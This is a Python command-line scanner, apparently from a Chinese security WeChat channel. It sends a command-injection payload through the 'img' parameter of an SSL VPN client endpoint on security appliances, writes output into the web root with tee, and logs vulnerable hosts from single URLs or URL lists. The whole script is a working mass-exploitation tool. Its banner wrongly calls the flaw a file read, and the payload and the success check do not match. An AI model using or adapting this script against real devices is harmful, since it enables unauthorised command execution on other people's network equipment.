import requests
import argparse
from tqdm import tqdm

requests.urllib3.disable_warnings()


def main(urls):
    for url in urls:
        try:
            if not url.startswith("http://") and not url.startswith("https://"):
                url = "http://" + url
            res = requests.get(
                url + "/sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60zgsf%60%20|tee%20/usr/local/webui/sslvpn/zgsf.txt|ls", verify=False, timeout=10)
            if isinstance(res.text, str):
                shell_url = url + '/sslvpn/zgsf.txt'
                if 'x /tmp|echo `whoami` |tee /usr/local/webui/sslvpn/zgsf.txt|ls' in res.text:
                    print(f'[+]存在漏洞:{shell_url}')
                    with open('exp2_ok.txt', 'a') as f:
                        f.write(shell_url + '\n')
            else:
                print(f'[!]漏洞不存在或发生异常: {res.text}')
        except requests.exceptions.Timeout as e:
            print(f'[!]连接超时: {e}')
        except Exception as e:
            print(f'[!]漏洞不存在或发生异常: {e}')


# if __name__ == "__main__":
#     print("多厂商安全设备命令执行检测工具！")
#     print("-----------------------------------------------------------")
#     print("微信公众号:知攻善防实验室!!")
#     print("-----------------------------------------------------------")
#     parser = argparse.ArgumentParser(description="检测URL是否存在漏洞")
#     parser.add_argument("-u", "--url", required=False, help="需要检测的URL")
#     parser.add_argument("-f", "--file", required=False, help="包含多个URL的文件路径")
#     args = parser.parse_args()

#     if args.file:
#         with open(args.file, 'r') as f:
#             urls = [line.strip() for line in f.readlines()]
#     elif args.url:
#         urls = [args.url]
#     else:
#         print("请在添加 -h 获取提示信息！!!")
#         exit()

#     main(urls)
if __name__ == "__main__":
    print("欢迎使用迪普VPN Service 接口存在任意文件读取漏洞检测工具！")
    print("-----------------------------------------------------------")
    print("微信公众号:知攻善防实验室!!")
    print("-----------------------------------------------------------")
    parser = argparse.ArgumentParser(description="检测URL是否存在漏洞")
    parser.add_argument("-u", "--url", required=False, help="需要检测的URL")
    parser.add_argument("-f", "--file", required=False, help="包含多个URL的文件路径")
    args = parser.parse_args()

    if args.file:
        with open(args.file, 'r') as f:
            urls = [line.strip() for line in f.readlines()]
    elif args.url:
        urls = [args.url]
    else:
        print("请在添加 -h 获取提示信息！!!")
        exit()
    main(urls)
